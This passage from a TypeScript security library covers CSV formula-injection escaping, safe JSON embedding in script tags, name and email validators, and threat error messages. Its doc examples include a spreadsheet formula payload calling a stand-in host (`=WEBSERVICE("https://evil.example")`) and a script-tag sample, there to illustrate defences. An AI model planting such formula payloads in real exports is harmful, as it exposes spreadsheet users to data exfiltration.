 *   were never checked.
 * - The apostrophe is an Excel convention, **not** an RFC 4180 construct. Readers that do
 *   not implement it surface it as a literal character in the data.
 * - **A reader that splits on any other character is not protected.** That includes `|`,
 *   a space, and a character that only NFKC folds onto a boundary, such as the full-width
 *   comma U+FF0C. A value holding one of them followed by a trigger gets no apostrophe
 *   there, and is quoted only if it holds a character that requires quoting. Quoting
 *   protects that reader at most in the first column; in any later column, or wherever the
 *   value is not quoted, it starts a live cell there. Read the file with the delimiter it
 *   was written with.
 * - A field containing a comma, semicolon or TAB is quoted whatever the delimiter, and so
 *   is a field containing any character of a multi-character delimiter. Quoting changes no
 *   value, and protects only a reader in step with the writer.
 * - **The delimiter must play no other part in the file.** It is written between cells,
 *   where no apostrophe can go, and `escapeCsvField` accepts any delimiter. One containing
 *   `=`, `+`, `-`, `@` or a character whose NFKC form is one of them, such as their
 *   full-width or small forms, puts a trigger at the start of a field for a reader that
 *   splits on anything else: `toCsvRow(["", "1+1"], { delimiter: "=" })` is `=1+1`. One
 *   containing `'` lets a reader that splits on it cut the apostrophe off a neutralised
 *   cell. One containing `"`, CR or LF leaves the apostrophes working but breaks RFC 4180
 *   framing: a `"` there opens a quoted field where the writer meant a delimiter, and CR
 *   or LF ends the record for every RFC 4180 reader. No reader can then count on staying
 *   in step with the writer, which is all that quoting protects.
 * - NUL is removed rather than escaped, so it does not round-trip.
 * - Scanning the output with `scanForThreats` still reports a finding, by design:
 *   `CSV-FORMULA-LEAD-001` sees through the apostrophe and `CSV-DDE-001` is
 *   position-independent. The rules describe the *value*; this function protects the
 *   *file*. A clean scan is the wrong acceptance test.
 *
 * @param value - Cell value. `null` and `undefined` become `""`.
 * @param options - Optional dialect settings.
 * @param options.delimiter - Field separator the row will be joined with. Defaults to `","`.
 * @returns The escaped field, ready to join into a row.
 *
 * @example
 * ```ts
 * escapeCsvField("=WEBSERVICE(\"https://evil.example\")");
 * // quoted, and inert on open
 * escapeCsvField("a\n=1+1"); // "\"a\n'=1+1\"" — inert after the line break too
 * escapeCsvField("a\r\nb"); // "\"a\r\nb\"" — quoted, value unchanged
 * escapeCsvField(-1234); // "-1234" — a number, not a formula
 * ```
 */
export function escapeCsvField(
	value: unknown,
	options: { readonly delimiter?: string } = {},
): string {
	if (value === null || value === undefined) return "";

	const delimiter = options.delimiter ?? ",";
	const isTrustedScalar =
		typeof value === "number" || typeof value === "boolean" || typeof value === "bigint";
	const isUntrustedText = !isTrustedScalar;
	const text = typeof value === "string" ? value : String(value);

	// NUL cannot be represented in a CSV field and breaks several readers outright.
	// biome-ignore lint/suspicious/noControlCharactersInRegex: NUL is a control character by definition
	const cleaned = text.replace(/\u0000/g, "");

	// The NFKC form is only tested, never written: the rule matches the scan's `nfkc`
	// variant, and the file keeps the value as the caller wrote it apart from the
	// apostrophes. Only heads are normalized. NFKC can expand one character to 18
	// (U+FDFA), so normalizing a large value could throw a RangeError and abort the
	// export, and a match depends only on the leading run and the character after it.
	const neutralised = isUntrustedText
		? insertApostrophes(cleaned, [
				...(formulaLeadsAtStart(cleaned) ? [0] : []),
				...formulaLeadStarts(cleaned, csvFieldStarts(cleaned, delimiter)),
			])
		: cleaned;

	// Any one character of a multi-character delimiter can split the row for a reader that
	// splits on that character alone.
	const containsDelimiter = [...delimiter].some((character) => neutralised.includes(character));
	const mustQuote = CSV_QUOTE_REQUIRED.test(neutralised) || containsDelimiter;
	return mustQuote ? `"${neutralised.replaceAll('"', '""')}"` : neutralised;
}

/**
 * Escape and join one row for CSV export.
 *
 * @param values - Cell values, in column order.
 * @param options - Optional dialect settings.
 * @param options.delimiter - Field separator. Defaults to `","`.
 * @returns The joined row, without a line terminator.
 *
 * @example
 * ```ts
 * toCsvRow(["Ada Lovelace", "=1+1", 42]);
 * ```
 */
export function toCsvRow(
	values: readonly unknown[],
	options: { readonly delimiter?: string } = {},
): string {
	if (!Array.isArray(values)) return "";
	const delimiter = options.delimiter ?? ",";
	return values.map((value) => escapeCsvField(value, { delimiter })).join(delimiter);
}

/**
 * The five characters that must not survive into a script element verbatim.
 *
 * None is a JSON structural character, so each can only ever occur inside a string
 * literal, where a unicode escape is legal and semantically identical. That is what makes
 * this transformation safe to apply to `JSON.stringify` output without reparsing it.
 *
 * `<` and `>` close the element; `&` matters when a caller relocates the payload into a
 * context that *is* entity-decoded; U+2028 and U+2029 terminate a line in JavaScript
 * source, which JSON permits raw inside strings.
 */
const SCRIPT_UNSAFE_JSON = /[<>&\u2028\u2029]/g;

/** Escapes for {@link SCRIPT_UNSAFE_JSON}, all valid inside a JSON string literal. */
const SCRIPT_JSON_ESCAPES: Readonly<Record<string, string>> = {
	"<": "\\u003c",
	">": "\\u003e",
	"&": "\\u0026",
	"\u2028": "\\u2028",
	"\u2029": "\\u2029",
};

/**
 * Serialise a value for embedding inside a `<script>` element.
 *
 * `JSON.stringify` alone is not safe here. Its output may contain `</script>`, which
 * closes the element from *inside a string literal* — the HTML tokenizer never looks at
 * JavaScript syntax — so the remainder of the payload becomes markup.
 *
 * **Script element content only.** The output contains unescaped `"`, so it must never be
 * placed in an attribute; use {@link escapeHtmlAttribute} there. It is also not a general
 * JavaScript-string escaper — it is safe precisely because `JSON.stringify` has already
 * decided where the string boundaries are.
 *
 * Using `<script type="application/json">` with `JSON.parse(el.textContent)` does **not**
 * remove the need for this: a raw `</script>` in the data closes that element too.
 *
 * @param value - Any JSON-serialisable value.
 * @returns JSON text safe to place between `<script>` tags.
 * @throws {TypeError} If `value` cannot be represented as JSON — `undefined`, a function
 *   or a symbol at the top level (for which `JSON.stringify` returns `undefined` rather
 *   than a string), a circular structure, or a `BigInt`. Failing loudly is deliberate: a
 *   sentinel string would emit a syntax error into the page instead.
 *
 * @example
 * ```ts
 * const json = encodeJsonForScript({ name: userName });
 * const html = "<script>window.__DATA__ = " + json + ";</script>";
 * ```
 */
export function encodeJsonForScript(value: unknown): string {
	let serialised: string | undefined;
	try {
		serialised = JSON.stringify(value);
	} catch (cause) {
		throw new TypeError("encodeJsonForScript: value is not JSON-serialisable", { cause });
	}

	// `JSON.stringify` returns undefined — not a string — for undefined, functions and
	// symbols at the top level, so the escape pass below would throw on a non-string.
	if (typeof serialised !== "string") {
		throw new TypeError(
			`encodeJsonForScript: ${typeof value} has no JSON representation at the top level`,
		);
	}

	return serialised.replace(
		SCRIPT_UNSAFE_JSON,
		(character) => SCRIPT_JSON_ESCAPES[character] ?? character,
	);
}

//#region Unicode helpers

/**
 * Fold non-ASCII lookalike characters onto ASCII and compose to NFC.
 *
 * @deprecated Prefer `getSkeleton` and `analyzeIdentifier` from
 *   `@resq-systems/security/unicode`. Rewriting a user's identifier into a different
 *   string loses information and only *looks* safe — the durable pattern is to store
 *   what they typed, index its skeleton, and compare skeletons for collisions.
 *
 * Now backed by the UTS #39 confusable tables rather than the previous 14-entry map,
 * so coverage is far wider. Combining marks are preserved (`e` + U+0301 still composes
 * to `é`) and ASCII characters are never rewritten.
 *
 * @param input - Raw string from an untrusted source. Non-string input yields `""`.
 * @returns NFC-composed string with non-ASCII confusables folded to ASCII.
 */
export function normalizeUnicode(input: string): string {
	return foldConfusables(input);
}

//#endregion

//#region Field validators

/**
 * Generic user-facing fallback message. Render verbatim when a detector fires and you
 * do not want to reveal which one.
 */
export const THREAT_DETECTED_MESSAGE = "Input contains potentially unsafe content";

/**
 * Refinement helper for `zod.string().refine(...)`, `effect/Schema.filter(...)`, or
 * any predicate-based validator. Equivalent to {@link isSafeInput} with defaults.
 *
 * @param input - String to test.
 * @returns `true` when no detector fires.
 */
export function validateSafeText(input: string): boolean {
	return isSafeInput(input);
}

/**
 * Letters, marks, apostrophes, hyphens, periods, spaces, and the two joiners — nothing
 * else.
 *
 * U+200C (ZWNJ) and U+200D (ZWJ) are part of the spelling, not decoration. Persian and
 * Hindi names need them to be written correctly — a ZWNJ is what keeps the two halves
 * of `می‌روم` from joining — so a pattern without them rejects the name its owner
 * actually has. They carry no injection risk here: everything a payload needs (`<`,
 * `(`, `;`, `$`, `=`, digits) stays excluded. Written as escapes, not literals — an
 * invisible character pasted into a character class is unreviewable in a diff.
 */
const PERSON_NAME_PATTERN = /^[\p{L}\p{M}'’.\-\s\u{200C}\u{200D}]+$/u;

/** Shortest accepted name. Mononyms and single-letter names exist. */
const MIN_NAME_LENGTH = 1;

/** Longest accepted name. */
const MAX_NAME_LENGTH = 200;

/**
 * Validate a human name field.
 *
 * The policy is an allowlist of what a name is made of — letters in any script,
 * combining marks, apostrophes, hyphens, periods, spaces — plus a length bound and a
 * bidirectional-control check. Nothing that passes it can carry an injection payload,
 * because `<`, `(`, `;`, `$`, `=`, and every digit are already excluded.
 *
 * It deliberately does **not** run SQL, path-traversal, or confusable detectors. A
 * name is not a query, a path, or a protected identifier, and subjecting one to those
 * checks rejects real people: the previous implementation ran the homoglyph detector
 * here, which failed any name containing а, е, о, р, с, or х — that is, most Russian,
 * Ukrainian, Bulgarian, Serbian, and Greek names.
 *
 * Encode the value at whatever sink it eventually reaches. That is what makes it safe;
 * this function only establishes that it is a name.
 *
 * @param input - Candidate name.
 * @returns `true` when the value is a plausible name.
 *
 * @example
 * ```ts
 * validatePersonName("O'Brien");            // true
 * validatePersonName("José García");        // true
 * validatePersonName("Ольга Иванова");      // true
 * validatePersonName("John123");            // false
 * validatePersonName("<script>x</script>"); // false
 * ```
 */
export function validatePersonName(input: string): boolean {
	if (typeof input !== "string") return false;

	const normalized = input.normalize("NFC");
	if (normalized.length < MIN_NAME_LENGTH || normalized.length > MAX_NAME_LENGTH) {
		return false;
	}

	// Hostile in any field: reorders rendered text away from its logical order.
	if (containsBidiControls(normalized)) return false;

	return PERSON_NAME_PATTERN.test(normalized);
}

/**
 * Validate a human name field.
 *
 * @deprecated Renamed to {@link validatePersonName}. The old name implied a general
 *   "safe name" check and was implemented as one, running injection and homoglyph
 *   detectors against people's names. Behaviour now matches
 *   {@link validatePersonName}.
 *
 * @param input - Candidate name.
 * @returns `true` when the value is a plausible name.
 */
export function validateSafeName(input: string): boolean {
	return validatePersonName(input);
}

/** Longest address accepted, per RFC 5321 §4.5.3.1.3. Also bounds regex cost. */
const MAX_EMAIL_LENGTH = 254;

/** RFC-shaped address check. Length is bounded before this runs. */
const EMAIL_PATTERN =
	/^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;

/**
 * Validate an email address.
 *
 * Two checks: an RFC-shaped format match (length-bounded first, so the pattern never
 * sees an unbounded string), and UTS #39 identifier analysis of the **domain**, where
 * a mixed-script host is the IDN homograph attack — `аpple.com` with a Cyrillic `а`
 * resolves somewhere else entirely.
 *
 * The local part is not confusable-checked: it is not a routable identifier, and
 * flagging it would reject legitimate internationalized mailboxes.
 *
 * @param input - Candidate address.
 * @returns `true` when the format is valid and the domain is not a script mix.
 */
export function validateSafeEmail(input: string): boolean {
	if (typeof input !== "string") return false;
	if (input.length > MAX_EMAIL_LENGTH) return false;
	if (!EMAIL_PATTERN.test(input)) return false;

	const domain = input.slice(input.lastIndexOf("@") + 1);
	const analysis = analyzeIdentifier(domain);

	return !analysis.isMixedScript && !analysis.hasBidiControls;
}

//#endregion

//#region Error messages

/**
 * Render a user-facing error message for a detection result.
 *
 * Uses only the **first** finding: enumerating every category that fired leaks the
 * shape of the rule set to whoever is probing it. Log `result.threats` server-side for
 * diagnostics and return this to the client.
 *
 * @param result - A {@link ThreatDetectionResult}, a `ThreatScanResult`-shaped object,
 *   or any `{ isSafe, threats }` pair.
 * @returns A message, or `""` when the result is safe — so `message || undefined`
 *   works at a call site.
 */
export function getThreatErrorMessage(result: {
	readonly isSafe: boolean;
	readonly threats: readonly ThreatSummary[];
}): string {
	if (result.isSafe) return "";

	const threat = result.threats[0];
	if (!threat) return THREAT_DETECTED_MESSAGE;

	switch (threat.type) {
		case "xss":
			return "Input contains potentially malicious script content";
		case "sql_injection":
			return "Input contains potentially malicious database commands";
		case "nosql_injection":
			return "Input contains potentially malicious query operators";
		case "command_injection":
			return "Input contains potentially malicious system commands";
		case "path_traversal":
			return "Input contains potentially malicious file path characters";
		case "prototype_pollution":
			return "Input contains potentially malicious object property names";
		case "homoglyph":
			return "Input contains suspicious lookalike characters";
		case "header_injection":
			return "Input contains line breaks that are not allowed in this field";
		case "ldap_injection":
			return "Input contains potentially malicious directory query characters";
		case "xpath_injection":
			return "Input contains potentially malicious query expressions";
		case "xml_injection":
			return "Input contains potentially malicious document declarations";
		case "template_injection":
			return "Input contains potentially malicious template expressions";
		case "file_inclusion":
			return "Input contains potentially malicious resource references";
		case "ssrf":
			return "Input contains a network address that is not allowed";
		case "formula_injection":
			return "Input contains spreadsheet formula characters";
		case "log_injection":
			return "Input contains characters that are not allowed in this field";
		case "prompt_injection":
			return "Input contains instructions that are not allowed in this field";
		case "parameter_pollution":
			return "Input contains additional query parameters that are not allowed";
		case "credential_exposure":
			// Deliberately not phrased as an accusation. This category detects the
			// application's own secret on its way *out* — into a URL it is about to
			// fetch, or a line it is about to log — so the submitter is usually not at
			// fault and a "your input is malicious" message would be wrong.
			return "Request contains credential material that must not be sent or stored here";
		case "jwt_tampering":
			return "Token is not signed with an accepted algorithm";
		case "double_encoding":
			return "Input contains characters that are encoded more than once";
		case "resource_abuse":
			return "Input is too large or too repetitive to process";
		default:
			return assertNever(threat.type);
	}
}

//#endregion
